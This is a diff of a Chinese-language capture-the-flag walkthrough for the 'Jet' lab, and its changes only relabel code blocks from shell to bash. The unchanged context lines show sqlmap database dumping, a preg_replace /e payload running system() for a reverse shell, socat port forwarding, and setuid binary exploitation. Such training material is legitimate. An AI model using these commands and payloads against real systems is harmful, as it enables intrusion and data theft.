@@ -32,7 +32,7 @@ Jet 的使命是成为购物和节省开销的最智能方式，几乎可以在�
 
 ## First of all
 
-```shell title="sudo nmap -A --min-rate=5000 -T4 -sU --top-ports 20 10.13.37.10"
+```bash title="sudo nmap -A --min-rate=5000 -T4 -sU --top-ports 20 10.13.37.10"
 Nmap scan report for 10.13.37.10
 Host is up (0.44s latency).
 
@@ -43,7 +43,7 @@ PORT      STATE         SERVICE      VERSION
 ......
 ```
 
-```shell title="rustscan --ulimit 5000 10.13.37.10"
+```bash title="rustscan --ulimit 5000 10.13.37.10"
 Open 10.13.37.10:22
 Open 10.13.37.10:53
 Open 10.13.37.10:80
@@ -52,7 +52,7 @@ Open 10.13.37.10:7777
 Open 10.13.37.10:9201
 ```
 
-```shell title="sudo nmap -A --min-rate=5000 -T4 -p 22,53,80,5555,7777,9201 10.13.37.10"
+```bash title="sudo nmap -A --min-rate=5000 -T4 -p 22,53,80,5555,7777,9201 10.13.37.10"
 Nmap scan report for 10.13.37.10
 Host is up (0.40s latency).
 
@@ -388,7 +388,7 @@ JET{s3cur3_js_w4s_not_s0_s3cur3_4ft3r4ll}
 
 对 `http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php` 登陆界面进行 sql 注入探测
 
-```shell title="sqlmap -u http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php --forms --random-agent --level=5 --risk=3 --batch"
+```bash title="sqlmap -u http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php --forms --random-agent --level=5 --risk=3 --batch"
 POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
 sqlmap identified the following injection point(s) with a total of 1327 HTTP(s) requests:
 ---
@@ -405,7 +405,7 @@ Parameter: username (POST)
 
 将数据库提取出来
 
-```shell title="sqlmap -u http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php --forms --random-agent --level=5 --risk=3 --batch --dbs"
+```bash title="sqlmap -u http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php --forms --random-agent --level=5 --risk=3 --batch --dbs"
 available databases [2]:
 [*] information_schema
 [*] jetadmin
@@ -413,7 +413,7 @@ available databases [2]:
 
 提取出来数据库中的表
 
-```shell title="sqlmap -u http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php --forms --random-agent --level=5 --risk=3 --batch -D jetadmin --tables"
+```bash title="sqlmap -u http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php --forms --random-agent --level=5 --risk=3 --batch -D jetadmin --tables"
 Database: jetadmin
 [1 table]
 +-------+
@@ -423,7 +423,7 @@ Database: jetadmin
 
 将表中的数据提取出来
 
-```shell title="sqlmap -u http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php --forms --random-agent --level=5 --risk=3 --batch -D jetadmin -T users --dump"
+```bash title="sqlmap -u http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php --forms --random-agent --level=5 --risk=3 --batch -D jetadmin -T users --dump"
 Database: jetadmin
 Table: users
 [1 entry]
@@ -534,7 +534,7 @@ swearwords[/fuck/ie]=system($_GET["shell"])&swearwords[/shit/i]=poop&swearwords[
 
 成功得到回连的 shell
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ pwncat-cs -lp 9999
 [17:23:16] Welcome to pwncat 🐈!
@@ -573,7 +573,7 @@ JET{pr3g_r3pl4c3_g3ts_y0u_pwn3d}
 
 进入到 `/home` 目录进行枚举
 
-```shell
+```bash
 (remote) www-data@jet:/home$ ls -lh
 total 36K
 drwxrwx--- 2 alex          alex          4.0K Jan  3  2018 alex
@@ -587,14 +587,14 @@ drwxr-xr-x 3 tony          tony          4.0K Dec 28  2017 tony
 
 可以看到 `/home/leak` 文件有权限进行读取，并且具有 suid 权限
 
-```shell
+```bash
 (remote) www-data@jet:/home$ file /home/leak
 /home/leak: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e423d25f1c41c318a8f5702f93b8e3f47273256a, not stripped
 ```
 
 将文件下载到本地
 
-```shell
+```bash
 (local) pwncat$ download /home/leak
 /home/leak ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 9.1/9.1 KB • ? • 0:00:00
 [17:37:50] downloaded 9.11KiB in 2.11 seconds
@@ -624,7 +624,7 @@ Shellcode 参考自 [Linux/x86-64 - Execute /bin/sh - 27 bytes](http://shell-sto
 
 首先，先将程序映射到自定义端口
 
-```shell
+```bash
 socat TCP4-LISTEN:12344,reuseaddr,fork EXEC:/home/leak
 ```
 
@@ -655,7 +655,7 @@ Python2 脚本
 
 成功建立会话，user 为 `alex`
 
-```shell
+```bash
 (py2) ┌─[randark@parrot]─[~/tmp]
 └──╼ $ python2 test.py
 [+] Opening connection to 10.13.37.10 on port 12344: Done
@@ -667,7 +667,7 @@ alex
 
 在 alex 的用户目录中，得到 flag
 
-```shell
+```bash
 $ ls -lh /home/alex
 total 20K
 -rw-r--r-- 1 root root  659 Jan  3  2018 crypter.py
@@ -883,7 +883,7 @@ VVQFAAONrENadXgLAAEEAAAAAAQAAAAAUEsFBgAAAAACAAIAnQAAAMIbAAAAAA==
 
 首先，编译 featherduster 的 Docker 镜像
 
-```shell
+```bash
 git clone https://github.com/nccgroup/featherduster
 docker build -t featherduster .
 ```
@@ -950,7 +950,7 @@ This email and any files transmitted with it are confidential and intended solel
 
 同时查看服务器上开放的端口
 
-```shell title="netstat -tuln"
+```bash title="netstat -tuln"
 Active Internet connections (only servers)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State
 tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
@@ -977,7 +977,7 @@ udp6       0      0 :::53                   :::*
 
 这个端口没有对外界开放，所以先将端口进行转发
 
-```shell
+```bash
 socat tcp-listen:9999,reuseaddr,fork tcp:localhost:9300
 ```
 
@@ -1025,7 +1025,7 @@ public class Program {
 
 运行此程序，得到以下信息
 
-```shell
+```bash
 {
   "timestamp": "2017-11-13 08:31",
   "subject": "Just a heads up Rob",
@@ -1085,7 +1085,7 @@ JET{3sc4p3_s3qu3nc3s_4r3_fun}
 
 在上文得到的压缩包中，有两个文件
 
-```shell
+```bash
 Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----
 -----          2017/12/27    22:21          10224 membermanager
@@ -1209,7 +1209,7 @@ JET{h34p_f0r_73h_b4bi3z}
 
 在 `/home/tony` 目录中，有以下文件
 
-```shell
+```bash
 (remote) www-data@jet:/home/tony$ ls -lah
 total 40K
 drwxr-xr-x 3 tony tony 4.0K Dec 28  2017 .
@@ -1225,7 +1225,7 @@ drwxr-xr-x 2 root root 4.0K Dec 28  2017 keys
 
 将密钥文件以及加密后的文件都下载到本地
 
-```shell
+```bash
 (local) pwncat$ download secret.enc
 secret.enc ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 4.8/4.8 KB • ? • 0:00:00
 [21:25:37] downloaded 4.77KiB in 2.35 seconds                                                                                                                                                     download.py:71
@@ -1239,7 +1239,7 @@ key.bin.enc ━━━━━━━━━━━━━━━━━━━━━━�
 
 然后使用 [Github - RsaCtfTool/RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool) 进行破解
 
-```shell
+```bash
 (env) ┌─[✗]─[randark@parrot]─[~]
 └──╼ $ python3 ./tools/RsaCtfTool/RsaCtfTool.py --publickey public.crt --private
 ['public.crt']
@@ -1271,7 +1271,7 @@ bzwDyPPczkvzOAyTGsGUfeHhseLHZKVAvqzLbrEdTFo906cZWpLJAIEt8SD9
 
 将破解出来的私钥保存为 `` 文件，然后执行解密
 
-```shell
+```bash
 (env) ┌─[✗]─[randark@parrot]─[~]
 └──╼ $ openssl pkeyutl -decrypt -inkey private.crt -in key.bin.enc -out file
 (env) ┌─[randark@parrot]─[~]
@@ -1385,7 +1385,7 @@ shell.interactive()
 
 得到
 
-```shell
+```bash
 $ cat flag.txt
 Congrats! JET{7h47s_7h3_sp1r17}
 
